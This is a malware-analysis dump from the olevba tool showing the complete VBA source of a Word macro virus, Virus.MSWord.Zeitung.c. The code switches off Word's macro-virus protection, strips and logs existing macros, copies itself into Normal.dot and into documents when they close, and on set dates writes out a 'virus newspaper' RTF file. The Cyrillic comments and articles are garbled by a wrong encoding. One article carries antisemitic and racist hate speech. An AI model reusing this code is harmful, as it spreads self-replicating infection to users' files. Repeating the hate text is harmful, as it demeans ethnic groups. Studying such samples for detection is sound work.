olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Zeitung.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Zeitung.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Const Signature = "VirusZeitung" 'ñèãíàòóðà âèðóñà
'èó îäë:ÀêäéÔíðâêé ëêàä ôåî  èàëØòëâ@Âðññçàè ðàè èàåñè,ÀåñíðÅðìâèÌõè ààî
'2
'íîìåð 2 çà 2000 ãîä
Dim sd, reg As Boolean
Private Function Kontaminat(O)
 If Not O.codemodule.Find(Signature, 1, 1, 100, 100) Then
  Kontaminat = 0
 Else
  If O.codemodule.countoflines < 50 Then
   Kontaminat = 0
  Else
   Ant$ = Trim(O.codemodule.lines(3, 1))
   Ant$ = Trim(Mid(Ant$, 2, Len(Ant$) - 1))
   If Val(Ant$) < 65535 Then
    Kontaminat = Val(Ant$)
   Else
    Kontaminat = -1
   End If
 End If
 End If
End Function
Private Sub Document_Open()
 On Error Resume Next
 Dim ad, nt As Object
 Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
 Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
 If Mid(ActiveDocument.Name, 1, 12) = "Àäñêèé îãîíü" Then
  Exit Sub
 End If
 reg = False
 p = 0.05
 Tag$ = ""
 Monat$ = ""
 datum$ = Trim(Date)
 i = 1
 While (Mid(datum$, i, 1) <> ".") And (i < Len(datum$))
  Tag$ = Tag$ + Mid(datum$, i, 1)
  i = i + 1
 Wend
 i = i + 1
 While (Mid(datum$, i, 1) <> ".") And (i < Len(datum$))
  Monat$ = Monat$ + Mid(datum$, i, 1)
  i = i + 1
 Wend
 If (Val(Monat$) = 2) And (Val(Tag$) = 2) Then p = 2 ' 2  ôåâðàëÿ
 If (Val(Monat$) = 3) And (Val(Tag$) = 21) Then p = 2 ' 21 ìàðòà
 If (Val(Monat$) = 4) And (Val(Tag$) = 30) Then p = 2 ' 30 àïðåëÿ
 If (Val(Monat$) = 6) And (Val(Tag$) = 21) Then p = 2 ' 21 èþíÿ
 If (Val(Monat$) = 8) And (Val(Tag$) = 2) Then p = 2 ' 2  àâãóñòà
 If (Val(Monat$) = 9) And (Val(Tag$) = 21) Then p = 2 ' 21 ñåíòÿáðÿ
 If (Val(Monat$) = 10) And (Val(Tag$) = 31) Then p = 2 ' 31 îêòÿáðÿ
 If (Val(Monat$) = 12) And (Val(Tag$) = 21) Then p = 2 ' 21 äåêàáðÿ
 If Rnd >= p Then
  Exit Sub
 End If
 Documents.Add Template:="Normal", NewTemplate:=False
 With ActiveDocument.PageSetup
      .LineNumbering.Active = False
      .Orientation = wdOrientPortrait
      .TopMargin = CentimetersToPoints(1.5)
      .BottomMargin = CentimetersToPoints(1.5)
      .LeftMargin = CentimetersToPoints(2.5)
      .RightMargin = CentimetersToPoints(2)
      .Gutter = CentimetersToPoints(0)
      .HeaderDistance = CentimetersToPoints(1.25)
      .FooterDistance = CentimetersToPoints(1.25)
      .PageWidth = CentimetersToPoints(21)
      .PageHeight = CentimetersToPoints(29.7)
      .FirstPageTray = wdPrinterDefaultBin
      .OtherPagesTray = wdPrinterDefaultBin
      .SectionStart = wdSectionNewPage
      .OddAndEvenPagesHeaderFooter = False
      .DifferentFirstPageHeaderFooter = False
      .VerticalAlignment = wdAlignVerticalTop
      .SuppressEndnotes = False
      .MirrorMargins = False
 End With
 Druck_0 "À Ä Ñ Ê È É   Î Ã Î Í Ü", 40, True, wdAlignParagraphCenter, 0, False
 Druck_0 "Âèðóñíàÿ ãàçåòà ñåêòû èì. Äæ. Äè è Ý. Êåëëè.", 18, False, wdAlignParagraphLeft, 0, True
 Druck_0 "Âûõîä ïî ìåðå êîìïëåêòîâàíèÿ íîìåðà", 18, False, wdAlignParagraphLeft, 0, True
 Druck_0 "10 ìàÿ  2000  ã.   ¹ 2 (2)", 18, False, wdAlignParagraphLeft, 0, True
 Selection.TypeParagraph
 Druck_0 "Ñåãîäíÿ â íîìåðå:", 18, True, wdAlignParagraphLeft, 0, True
 Druck_0 "* Ìíåíèÿ ÷èòàòåëåé î ãàçåòå. (Ïîäáîðêà èíòåðâüþ)", 18, False, wdAlignParagraphLeft, 0, True
 Druck_0 "* Ïðåäëîæåíèÿ ïî óëó÷øåíèþ ðàáîòû ãàçåòû:", 18, False, wdAlignParagraphLeft, 0, True
 Druck_0 "** Ìû ñîâåðøåíñòâóåì ñâîé âèðóñ.", 18, False, wdAlignParagraphLeft, 0, True
 Druck_0 "** Íàñèëüíî ìèë íå áóäåøü.", 18, False, wdAlignParagraphLeft, 0, True
 Druck_0 "** Ñâîé âèðóñ - ñâîèìè ðóêàìè. ", 18, False, wdAlignParagraphLeft, 0, True
 Druck_0 "** Ìû - âàì, âû - íàì (î ïðîáëåìàõ îáðàòíîé ñâÿçè). ", 18, False, wdAlignParagraphLeft, 0, True
 Druck_0 "* Íàøè ïëàíû.", 18, False, wdAlignParagraphLeft, 0, True
 Selection.TypeParagraph
 Druck_0 "******************************", 18, True, wdAlignParagraphCenter, 0, True
 Selection.TypeParagraph
 vb = 1
 ve = 1
 reg = True
 vb = Artikel_B(nt, vb, 1)
 ve = Artikel_E(nt, vb + 1)
 Selection.TypeParagraph
 Druck_0 nt.codemodule.lines(vb, 1), 18, True, wdAlignParagraphCenter, 0, True
 Selection.TypeParagraph
 Druck_0 nt.codemodule.lines(ve, 1), 14, False, wdAlignParagraphJustify, 1.5, True
 vb = Artikel_B(nt, ve, 2)
 ve = Artikel_E(nt, vb + 1)
 Selection.TypeParagraph
 Druck_0 nt.codemodule.lines(vb, 1), 14, True, wdAlignParagraphLeft, 0, True
 Druck_0 nt.codemodule.lines(vb + 1, 1), 14, False, wdAlignParagraphJustify, 1.5, True
 Druck_0 nt.codemodule.lines(ve, 1), 14, False, wdAlignParagraphJustify, 1.5, False
 For art = 3 To 6
  vb = Artikel_B(nt, ve, art)
  ve = Artikel_E(nt, vb + 1)
  Selection.TypeParagraph
  Druck_0 nt.codemodule.lines(vb, 1), 14, True, wdAlignParagraphLeft, 1.5, True
  For v = vb + 1 To ve
   Druck_0 nt.codemodule.lines(v, 1), 14, False, wdAlignParagraphJustify, 1.5, True
  Next v
 Next art
 vb = Artikel_B(nt, ve, 7)
 ve = Artikel_E(nt, vb + 1)
 Selection.TypeParagraph
 Druck_0 nt.codemodule.lines(vb, 1), 14, True, wdAlignParagraphLeft, 1.5, True
 Druck_0 nt.codemodule.lines(vb + 1, 1), 14, False, wdAlignParagraphJustify, 1.5, True
 Selection.TypeParagraph
 For v = vb + 2 To ve
  Druck_0 nt.codemodule.lines(v, 1), 14, True, wdAlignParagraphRight, 1.5, True
 Next v
 Selection.TypeParagraph
 Selection.TypeParagraph
 For art = 8 To 11
  vb = Artikel_B(nt, ve, art)
  ve = Artikel_E(nt, vb + 1)
  Selection.TypeParagraph
  Druck_0 nt.codemodule.lines(vb, 1), 18, True, wdAlignParagraphCenter, 0, True
  Selection.TypeParagraph
  For v = vb + 1 To ve - 1
   Druck_0 nt.codemodule.lines(v, 1), 14, False, wdAlignParagraphJustify, 1.5, True
  Next v
  Selection.TypeParagraph
  Druck_0 nt.codemodule.lines(ve, 1), 14, True, wdAlignParagraphRight, 0, True
  Selection.TypeParagraph
 Next art
 Selection.TypeParagraph
 vb = Artikel_B(nt, ve, 12)
 ve = Artikel_E(nt, vb + 1)
 Selection.TypeParagraph
 Druck_0 nt.codemodule.lines(vb, 1), 18, True, wdAlignParagraphCenter, 0, True
 Selection.TypeParagraph
 Druck_0 nt.codemodule.lines(vb + 1, 1), 14, False, wdAlignParagraphJustify, 1.5, True
 Druck_0 nt.codemodule.lines(vb + 2, 1), 14, False, wdAlignParagraphJustify, 0, False
 Druck_0 nt.codemodule.lines(vb + 3, 1), 14, False, wdAlignParagraphJustify, 1.5, True
 Selection.TypeParagraph
 Druck_0 nt.codemodule.lines(vb + 4, 1), 14, False, wdAlignParagraphLeft, 0, True
 Selection.TypeParagraph
 Druck_0 nt.codemodule.lines(vb + 5, 1), 14, False, wdAlignParagraphJustify, 1.5, True
 Selection.TypeParagraph
 Druck_0 nt.codemodule.lines(ve, 1), 14, True, wdAlignParagraphRight, 0, True
 Selection.TypeParagraph
 Selection.TypeParagraph
 vb = Artikel_B(nt, ve, 13)
 ve = Artikel_E(nt, vb + 1)
 Selection.TypeParagraph
 Druck_0 nt.codemodule.lines(vb, 1), 18, True, wdAlignParagraphCenter, 0, True
 Selection.TypeParagraph
 Druck_0 nt.codemodule.lines(vb + 1, 1), 14, False, wdAlignParagraphJustify, 1.5, True
 Druck_0 nt.codemodule.lines(vb + 2, 1), 14, False, wdAlignParagraphJustify, 1.5, True
 Selection.TypeParagraph
 Druck_0 nt.codemodule.lines(vb + 3, 1), 14, True, wdAlignParagraphRight, 0, True
 reg = False
 Selection.TypeParagraph
 Druck_0 "*************************************", 14, False, wdAlignParagraphCenter, 0, True
 Druck_0 "Ó÷ðåäèòåëü - ñàòàíèíñêàÿ ñåêòà èìåíè Äæîíà Äè è Ýäâàðäà Êåëëè", 14, False, wdAlignParagraphCenter, 0, True
 Druck_0 "Ãëàâíûé ðåäàêòîð - Â. Ä. Òàðàñêèí", 14, False, wdAlignParagraphCenter, 0, True
 Druck_0 "Äèðåêòîð - Ã. Ñ. Ëèñóíîâ", 14, False, wdAlignParagraphCenter, 0, True
 Druck_0 "Àâòîð èäåè - À. Í. Ãåíîâà", 14, False, wdAlignParagraphCenter, 0, True
 Druck_0 "Êîíñóëüòàíò ïî âîïðîñàì âèðóñîëîãèè -  Ï. Â. Íîãèí", 14, False, wdAlignParagraphCenter, 0, True
 Druck_0 "Ãëàâíûé ïðîãðàììèñò - À. Â. Ðûæîâ", 14, False, wdAlignParagraphCenter, 0, True
 Druck_0 "Êîìïüþòåðíûé íàáîð è îôîðìëåíèå - Ò. Â. Çóáîâà", 14, False, wdAlignParagraphCenter, 0, True
 Druck_0 "Êîððåêòîð - Â. Ô. Ôåäîðîâ", 14, False, wdAlignParagraphCenter, 0, True
 Druck_0 "Ìíåíèå ðåäàêöèè ìîæåò íå ñîâïàäàòü ñ ïîçèöèåé àâòîðîâ ïóáëèêàöèé.", 14, False, wdAlignParagraphCenter, 0, True
 Druck_0 "Ïðè ïåðåïå÷àòêå è èñïîëüçîâàíèè ìàòåðèàëîâ ññûëêà íà ãàçåòó íåîáÿçàòåëüíà.", 14, False, wdAlignParagraphCenter, 0, True
 Druck_0 "Ðåäàêöèÿ íå íåñåò îòâåòñòâåííîñòè çà ñîäåðæàíèå ïóáëèêóåìûõ ìàòåðèàëîâ.", 14, False, wdAlignParagraphCenter, 0, True
 ActiveDocument.SaveAs FileName:="Àäñêèé îãîíü ¹ 2", FileFormat:=wdFormatRTF, LockComments:=False, Password:="", AddToRecentFiles:=True, WritePassword:="", ReadOnlyRecommended:=False, EmbedTrueTypeFonts:=False, SaveNativePictureFormat:=False, SaveFormsData:=False, SaveAsAOCELetter:=False
 ActiveDocument.Close
 Set nt = Nothing
 Set ad = Nothing
End Sub
Private Sub Document_Close()
 Dim ad, nt As Object
 Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
 Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
 On Error Resume Next
 Options.VirusProtection = False
 If (Kontaminat(ad) < Kontaminat(nt)) And ((ActiveDocument.SaveFormat = wdFormatDocument) Or (ActiveDocument.SaveFormat = wdFormatTemplate)) Then   'çàðàæåíèå àêòèâíîãî äîêóìåíòà
  sd = ActiveDocument.Saved
  cofl = ad.codemodule.countoflines
  If cofl > 0 Then
   Open "C:\" + ActiveDocument.ActiveWindow.Caption + ".TXT" For Append As #1
   Print #1, "Ìàêðîñû, áûâøèå â äîêóìåíòå äî âíåäðåíèÿ âèðóñà"
   For v = 1 To cofl
    Print #1, ad.codemodule.lines(v, 1)
   Next v
   Close #1
   ad.codemodule.deletelines 1, cofl
  End If
  For v = 1 To nt.codemodule.countoflines
   If Trim(nt.codemodule.lines(v, 1)) <> "" Then
    ad.codemodule.insertlines v, nt.codemodule.lines(v, 1)
   End If
  Next v
  If (sd = True) And (Mid(ActiveDocument.ActiveWindow.Caption, 1, 8) <> "Äîêóìåíò") Then ActiveDocument.Save
 End If
 If Kontaminat(ad) > Kontaminat(nt) Then   'çàðàæåíèå øàáëîíà Normal
  sd = NormalTemplate.Saved
  cofl = nt.codemodule.countoflines
  If cofl > 0 Then
   Open "C:\NORMAL.TXT" For Append As #1
   Print #1, "Ìàêðîñû, áûâøèå â øàáëîíå Normal.dot"
   For v = 1 To cofl
    Print #1, nt.codemodule.lines(v, 1)
   Next v
   Close #1
   nt.codemodule.deletelines 1, cofl
  End If
  For v = 1 To ad.codemodule.countoflines
   If Trim(ad.codemodule.lines(v, 1)) <> "" Then
    nt.codemodule.insertlines v, ad.codemodule.lines(v, 1)
   End If
  Next v
  If sd = True Then NormalTemplate.Save
 End If
 Set nt = Nothing
 Set ad = Nothing
End Sub
Private Sub Druck_0(T As String, Siz, Bld, Alg, Ind, Abz)
 Selection.Font.Size = Siz 'ðàçìåð øðèôòà
 Selection.Font.Bold = Bld 'æèðíîñòü
 Selection.ParagraphFormat.Alignment = Alg 'âûðàâíèâàíèå
 Selection.ParagraphFormat.FirstLineIndent = CentimetersToPoints(Ind) 'îòñòóï
 If Abz Then Selection.TypeParagraph
 If reg Then
  Selection.TypeText Text:=Mid(T, 2, Len(T) - 1)
 Else
  Selection.TypeText Text:=T
 End If
End Sub
Private Function Artikel_B(O, start, num)
 If (start < 1) Or (start > O.codemodule.countoflines) Then
  Artikel_B = -1
  Exit Function
 End If
 While (O.codemodule.lines(start, 1) <> "'Articl #" + Trim(num)) And (start <= O.codemodule.countoflines)
  start = start + 1
 Wend
 Artikel_B = start + 1
End Function
Private Function Artikel_E(O, start)
 If (start < 1) Or (start > O.codemodule.countoflines) Then
  Artikel_E = -1
  Exit Function
 End If
 While (Mid(O.codemodule.lines(start, 1), 1, 9) <> "'Articl #") And (start <= O.codemodule.countoflines)
  start = start + 1
 Wend
 If start > O.codemodule.countoflines Then
  start = start - 1
 End If
 Artikel_E = start - 1
End Function
'Articl #1
'ÏÅÐÂÛÉ ÍÎÌÅÐ ÂÛØÅË Â ÑÂÅÒ. ÌÍÅÍÈß  ×ÈÒÀÒÅËÅÉ.
'Âûõîä â ñâåò ïåðâîãî íîìåðà íàøåé ãàçåòû ñòàë íåîæèäàííîñòüþ äëÿ ìíîãèõ ëþäåé, èìåþùèõ äåëî ñ êîìïüþòåðàìè. Ìû ïîìåùàåì çäåñü íåáîëüøóþ ïîäáîðêó èíòåðâüþ, âçÿòûõ ó íåñêîëüêèõ ÷åëîâåê, âïåðâûå ïîçíàêîìèâøèõñÿ ñ "Àäñêèì îãíåì". Íàäååìñÿ, îíè äîñòàòî÷íî ïîëíî ïðåäñòàâëÿþò ñïåêòð ìíåíèé î íîâîé ãàçåòå. Ñëåäóåò îòìåòèòü, ÷òî íå âñå ëþäè ñîãëàøàëèñü íà èíòåðâüþ: ìíîãèå èñïûòûâàþò ñèëüíîå îòâðàùåíèå ê ñàòàíèñòàì è ñàòàíèíñêèì ñåêòàì.
'Articl #2
'Ëèïàòîâà Í. Í., ïàòåíòîâåä èç "Àñòðàõàíüãàçïðîìà".
'ß äóìàþ, ÷òî Âàøà ãàçåòà åñòü ïîëåçíåéøåå è íóæíîå èçîáðåòåíèå. Íå ñåêðåò, ÷òî ñåé÷àñ ñâîáîäà ïå÷àòè ñóùåñòâóåò òîëüêî íà áóìàãå, êîððóïöèÿ ñòàëà òîòàëüíîé, à ïðåññà ñïëîøü è ðÿäîì ëèæåò çàäíèöó âëàñòè, è íå âûïîëíÿåò ñâîåãî íàçíà÷åíèÿ. Ãàçåòà, êîòîðàÿ ïî-íàñòîÿùåìó ñâîáîäíà îò êàêîãî-ëèáî êîíòðîëÿ ñâåðõó, ñîâåðøåííî íåîáõîäèìà. Ó íåå åñòü òîëüêî îäèí íåäîñòàòîê: ñîâåðøåííî íåïîíÿòíî, êàê îñóùåñòâëÿåòñÿ îáðàòíàÿ ñâÿçü ìåæäó ÷èòàòåëÿìè è ãàçåòîé. Åñëè ÿ, ê ïðèìåðó, çàõî÷ó íàïèñàòü ïèñüìî â íåå, ïî êàêîìó àäðåñó åãî îòïðàâèòü? Äóìàþ, íàä ýòèì âîïðîñîì íàäî ïîðàáîòàòü. Êðîìå âñåãî ïðî÷åãî, ìíå î÷åíü ïîíðàâèëñÿ âàø ìàòåðèàë ïî íàöèîíàëüíîìó âîïðîñó. Ãîñïîäèí Ñàïóãèí ïîäíÿë âåñüìà àêòóàëüíóþ òåìó, îñîáåííî äëÿ íàøåãî ïðåäïðèÿòèÿ. Òàì, ãäå ÿ ðàáîòàþ, äàâíî òðåáóåòñÿ âìåøàòåëüñòâî ïàðòèè "ÐÍÅ". Ó íàñ ðóññêèõ ïî÷òè íå îñòàëîñü, íà êàæäîì ñêîëüêî-íèáóäü îòâåòñòâåííîì ïîñòó êàêîé-íèáóäü èíîðîäåö; âïðî÷åì, íå áóäó ãîëîñëîâíîé: â íàøåé ëàáîðàòîðèè ðàáîòàþò 8 ÷åëîâåê, èç íèõ ðóññêèõ òîëüêî òðîå, ñ÷èòàÿ ìåíÿ.
'Îñòàëüíûå: åâðåéêà, óêðàèíêà, ñïóòàâøàÿñÿ ñ àðàáîì, òàòàðêà, îäíà, âîîáùå íåîïðåäåëåííîé ðàñîâîé ïðèíàäëåæíîñòè è êàâêàçåö, âûäàþùèé ñåáÿ çà ðóññêîãî. Èç ðóññêèõ ìíîãèå ïóòàþòñÿ ñî âñÿêèìè èíîðîäöàìè è ïëîäÿò îò íèõ íåïîëíîöåííûõ äåòåé-ïîëóêðîâîê, à ó÷åíûì ñåêðåòàðåì â íàøåì èíñòèòóòå ðàáîòàåò ñòàðûé êîë÷åíîãèé åâðåé, ïî êîòîðîìó äàâíî ïëà÷åò ãàçîâàÿ êàìåðà. Ïóñòü ãîñïîäèí Ñàïóãèí çíàåò, ÷òî â ìîåì ëèöå îí âñåãäà íàéäåò ÿðîãî ñòîðîííèêà ñâîåãî äåëà. Åñëè ýòî âîçìîæíî, ÿ õîòåëà áû çíàòü, êàê ìîæíî âñòóïèòü â ïàðòèþ "Ðóññêîå íàöèîíàëüíîå åäèíñòâî".
'Articl #3
'Ðåçíèê Ä. Ì., ïðåïîäàâàòåëü ÀÃÒÓ.
'ß õîòåë áû ñêàçàòü, ÷òî íå îäîáðÿþ Âàøó ãàçåòó, òàê êàê îíà ïî ñâîåé ñóòè ïðåñòóïíàÿ, è ìàòåðèàëû, ïóáëèêóåìûå â íåé, òî æå íîñÿò ïðåñòóïíûé õàðàêòåð. Ñ÷èòàþ íóæíûì íàïîìíèòü Âàì, ÷òî íèêòî íå îòìåíÿë ñòàòåé Óãîëîâíîãî êîäåêñà, ïðåäóñìàòðèâàþùèõ óãîëîâíóþ îòâåòñòâåííîñòü çà ñîçäàíèå è ðàñïðîñòðàíåíèå êîìïüþòåðíûõ âèðóñîâ. Îòíîñèòåëüíî îïóáëèêîâàííûõ ìàòåðèàëîâ ìîãó ñêàçàòü, ÷òî âàøè ëþäè ñèëüíî ðèñêóþò, ñîîáùàÿ ñâîè ôàìèëèè. ×òî êàñàåòñÿ âàøåãî Ñàïóãèíà, òî îí ïðîñòî ãíèäà è êîçåë, ðàâíî êàê è Áàðêàøîâ. Ñîâåðøåííî ñëó÷àéíî ÿ óçíàë, êòî òàêîé Ñàïóãèí, è êàêèå êîçëû èç íàøåé àäìèíèñòðàöèè åìó ïîìîãàþò. Äóìàþ, ÷òî åãî ïîëèòè÷åñêàÿ äåÿòåëüíîñòü íåñîâìåñòèìà ñ ó÷åáîé â ÀÃÒÓ.
'Articl #4
'Âîåâîäèí È. Ã. ïðåïîäàâàòåëü ÀÃÒÓ.
'Ìíå êàæåòñÿ, ÷òî âàø âèðóñ íóæäàåòñÿ â çíà÷èòåëüíîì óñîâåðøåíñòâîâàíèè, òàê êàê ïðè ïåðâîì çàðàæåíèè îí íàìåðòâî âåøàåò Word è ñòðàäàåò ìíîæåñòâîì äðóãèõ íåäîðàáîòîê. ß äóìàþ, ÷òî çàðàæàòü äîêóìåíòû â ìîìåíò èõ îòêðûòèÿ è ñîçäàíèÿ ñîâåðøåííî íåîáÿçàòåëüíî: âî-ïåðâûõ, ýòî ïðèâîäèò ê çàâèñàíèþ, à âî-âòîðûõ ëþáîé ñîçäàííûé èëè îòêðûòûé äîêóìåíò îáÿçàòåëüíî áóäåò çàêðûò; çàðàæåíèå ïðè çàêðûòèè ïðåêðàñíî çàðåêîìåíäîâàëî ñåáÿ ó âñåõ ñîçäàòåëåé ìàêðîâèðóñîâ. Êðîìå òîãî, âíåäðåíèå òåêñòà ãàçåòû â ðåäàêòèðóåìûé äîêóìåíò ïî-ìîåìó íå ñîâñåì áåçâðåäíî è íàñòðàèâàåò âàøèõ ïîòåíöèàëüíûõ ÷èòàòåëåé ïðîòèâ âàñ. Áûëî áû íàìíîãî óäîáíåå ñîçäàâàòü ñïåöèàëüíûé ôàéë è çàïèñûâàòü òåêñò ãàçåòû â íåãî. Ðàíî èëè ïîçäíî ÷èòàòåëü îáíàðóæèò íîâûå ôàéëû íà äèñêå è çàõî÷åò  ñ íèìè îçíàêîìèòüñÿ. Òîãäà ýòî íèêîìó íå ïðè÷èíèò âðåäà.
'Articl #5
'Øóãàåâ Â. Ò. èíæåíåð.
'ß äóìàþ, ÷òî òàêàÿ ãàçåòà ñîâåðøåííî íåîáõîäèìà â íàøåì ãîðîäå, ãäå îò îáû÷íîé ïðåññû íåò íèêàêîãî òîëêà, òîëüêî îíà äîëæíà íàõîäèòüñÿ â ðóêàõ íå ñàòàíèñòîâ, à êàêîé-ëèáî íåéòðàëüíîé ãðóïïû ëþäåé. Ïîíèìàåòå, ðåáÿòà, âàøà ðåëèãèîçíàÿ ïðèíàäëåæíîñòü îòòàëêèâàåò ëþäåé îò âàñ. Ó íàñ ñëîâà "ñàòàíèçì" è "ñàòàíèñòû" âûçûâàþò èíñòèíêòèâíîå îòâðàùåíèå, à â ðåçóëüòàòå âàøè ïîòåíöèàëüíûå ÷èòàòåëè ïðîõîäÿò ìèìî âàæíîãî íà÷èíàíèÿ.
'Ñàì ÿ äàâíî óâëåêàþñü ïðîãðàììèðîâàíèåì, è ìíå êàæåòñÿ, ÷òî âû ñäåëàëè íàñòîÿùåå îòêðûòèå â îáëàñòè êîìïüþòåðíîé âèðóñîëîãèè: "âèðóñíîé ãàçåòû" (èëè "ãàçåòíîãî âèðóñà", êîìó êàê áîëüøå íðàâèòñÿ) åùå íèêòî, ïî ìîèì ñâåäåíèÿì, íå äåëàë. Ýòî î÷åíü õîðîøî, ÷òî âàøà ãàçåòà îòêðûòà äëÿ âñåõ, îäíàêî íåïîíÿòíî, êàêèì îáðàçîì ìîæíî íàïèñàòü ïèñüìî â ðåäàêöèþ íåå, âåäü íàñêîëüêî ÿ ïîíÿë, âû íå ïðèâåëè ñâîè êîîðäèíàòû? Ìåíÿ òàêæå èíòåðåñóåò, ìîæåòå ëè Âû ïîìåùàòü ðàçíûå îáúÿâëåíèÿ è ðåêëàìó?
'Articl #6
'Ñèìîíîâ È. Â. âðà÷-ïñèõèàòð.
'Ñðàçó ñêàæó, ÷òî â âàøåì äåëå ÿ ðàçáèðàþñü ñëàáî, íî ìíå êàæåòñÿ, ÷òî ãëàâàðþ âàøåé ñåêòû è äèðåêòîðó ãàçåòû òðåáóåòñÿ ñåðüåçíîå ëå÷åíèå. Ïî-ìîåìó îíè ñòðàäàþò ìàíèåé âåëè÷èÿ, êîòîðàÿ óæå äîâåëà èõ äî ïðîòèâîïðàâíûõ äåéñòâèé, è â äàëüíåéøåì ìîæåò ïðèâåñòè â òþðüìó. Òî æå ñàìîå ìîãó ñêàçàòü îáî âñåì àâòîðñêîì êîëëåêòèâå. Î÷åíü íàñòîðàæèâàåò òî îáñòîÿòåëüñòâî, ÷òî ýòè ëþäè îòêðûòî ïðèâîäÿò ñâîè ôàìèëèè, êîãäà ñëåäîâàëî áû îæèäàòü îò íèõ ìàêñèìàëüíîé ñêðûòíîñòè. Êàê âðà÷ ÿ íàñòîÿòåëüíî ðåêîìåíäóþ èì ïðîéòè îáñëåäîâàíèå íà ïðåäìåò ñîñòîÿíèÿ èõ ïñèõèêè, ïîêà åùå íå ïîçäíî.
'Articl #7
'Õàðèòîíîâ À. À., ñòóäåíò.
'Áåçóñëîâíî, íèêåì íå êîíòðîëèðóåìàÿ ãàçåòà íåîáõîäèìà, à òî, êàê âû åå ðàñïðîñòðàíÿåòå íå èìååò íèêàêîãî çíà÷åíèÿ. Òîëüêî âèðóñ íóæíî íåìíîãî äîðàáîòàòü, ÷òîáû îí íå èñêàæàë ðåäàêòèðóåìûé òåêñò. Õîòåëîñü áû çíàòü, êàê ó âàñ îñóùåñòâëÿåòñÿ ñâÿçü ñ îáùåñòâåííîñòüþ è ìîæåòå ëè âû îêàçàòü êîíêðåòíóþ ïîìîùü â êàêîì-ëèáî äåëå? Íåëüçÿ ëè ó âàñ ïîìåùàòü îáúÿâëåíèÿ î çíàêîìñòâàõ? Åñëè äà, òî ÿ îáåèìè ðóêàìè ãîëîñóþ çà ïðîäîëæåíèå âàøåãî äåëà è äàëüíåéøóþ ðàáîòó ãàçåòû.
'Êîððåñïîíäåíòû:  À. Ï. Ïåòóõîâ,
'Ê. Å. Âàñèëüêîâ,
'Ì. Â. ×óðèëîâ,
'Ñ. Ì. Ïåòðåíêî,
'À.Ã.Ðûáêèí
'Articl #8
'ÃÀÇÅÒÀ ÑÎÇÄÀÍÀ. ÊÓÄÀ ÒÅÏÅÐÜ ?
'Íà ìàðòîâñêîì øàáàøå 2000 ãîäà áûëî ñîçâàíî îòäåëüíîå çàñåäàíèå ñ ó÷àñòèåì ðóêîâîäèòåëåé ñåêòû è ðóêîâîäÿùåãî ñîñòàâà ãàçåòû; åãî òåìîé ñòàëè ïåðñïåêòèâû äàëüíåéøåãî ðàçâèòèÿ ãàçåòû "Àäñêèé îãîíü".
'Â íà÷àëå çàñåäàíèÿ ãëàâàðü ñåêòû âûñòóïèë ñ ñîîáùåíèåì î íåîáõîäèìîñòè èñïðàâëåíèÿ íåäîñòàòêîâ â ðàáîòå ãàçåòû, êîòîðûå ñäåðæèâàëè åå äàëüíåéøåå ðàñïðîñòðàíåíèå. Â õîäå ïîñëåäîâàâøåé çà ýòèì äèñêóññèè áûëè âûñêàçàíû ìíîãî÷èñëåííûå ïðåäëîæåíèÿ, ïîäâåðãàâøèåñÿ îáñóæäåíèþ âñåìè ó÷àñòíèêàìè çàñåäàíèÿ. Îòäåëüíûå ïðåäëîæåíèÿ áûëè ïðèíÿòû ê èñïîëíåíèþ. Çà îãðàíè÷åííîñòüþ ìåñòà ìû ïðèâîäèì íåêîòîðûå èç íèõ.
'Ëåòîïèñåö ñåêòû  À. Â. Àáäèêååâ
'Articl #9
'ÌÛ ÑÎÂÅÐØÅÍÑÒÂÓÅÌ ÑÂÎÉ ÂÈÐÓÑ
'Íà íàñòîÿùèé ìîìåíò íàìè ïðîäåëàíà îãðîìíàÿ ðàáîòà ïî ðàñïðîñòðàíåíèþ ãàçåòû "Àäñêèé îãîíü" è íàêîïëåí íåìàëûé îïûò èñïîëüçîâàíèÿ êîìïüþòåðíûõ âèðóñîâ â êîíñòðóêòèâíûõ öåëÿõ. Âìåñòå ñ òåì, îòìå÷åíû îòäåëüíûå íåäîñòàòêè, êîòîðûå áóäóò ïðåîäîëåíû  õîäå äàëüíåéøåé ðàáîòû.
'Â ÷àñòíîñòè, ïî îòçûâàì íàøèõ ñåêòàíòîâ, âçÿâøèõñÿ ðàñïðîñòðàíÿòü âèðóñ, ïðè çàðàæåíèè èì ãëàâíîãî øàáëîíà NORMAL.DOT â ïåðâûé ðàç Word "çàâèñàåò"; êðîìå òîãî, âèðóñ âñòàâëÿåò òåêñò ãàçåòû â ðåäàêòèðóåìûé äîêóìåíò, ÷òî íå âñåãäà èäåò íà ïîëüçó åãî ðàçáîð÷èâîñòè íà ýêðàíå, à òàêæå ðàçäðàæàåò ïîëüçîâàòåëÿ. Ïî ñëîâàì íàøåãî êîíñóëüòàíòà-âèðóñîëîãà Ï. Â. Íîãèíà âèðóñ ïåðåãðóæåí ëèøíèìè äåòàëÿìè, êîòîðûå òîëüêî òîðìîçÿò åãî ðàáîòó.
'Ñ ó÷åòîì âûøåñêàçàííîãî áûëè ïðîâåäåíû ïåðåãîâîðû ñ àâòîðàìè âèðóñà, êîòîðûå íàïèñàëè åãî íîâóþ âåðñèþ, íå èìåþùóþ äàííûõ íåäîñòàòêîâ. Íàìè áûëè ïðîâåäåíû âñåñòîðîííèå èñïûòàíèÿ íîâîãî âèðóñà íà êîìïüþòåðàõ ñåêòû, êîòîðûå ïîêàçàëè åãî ñïîñîáíîñòü êîððåêòíî çàðàæàòü ëþáûå äîêóìåíòû Word.
'Òåïåðü òåêñò ãàçåòû çàíîñèòñÿ â îòäåëüíûé ôàéë ôîðìàòà .RTF, êîòîðûé ïîëó÷àåò èìÿ "Àäñêèé îãîíü ¹ ..." è çàïèñûâàåòñÿ íà äèñê. Èíîãäà ýòî ïðîõîäèò íåçàìåòíî äëÿ ïîëüçîâàòåëÿ.
'Ãëàâíûé ïðîãðàììèñò ñåêòû   À. Â. Ðûæîâ
'Articl #10
'ÍÀÑÈËÜÍÎ  ÌÈË  ÍÅ  ÁÓÄÅØÜ.
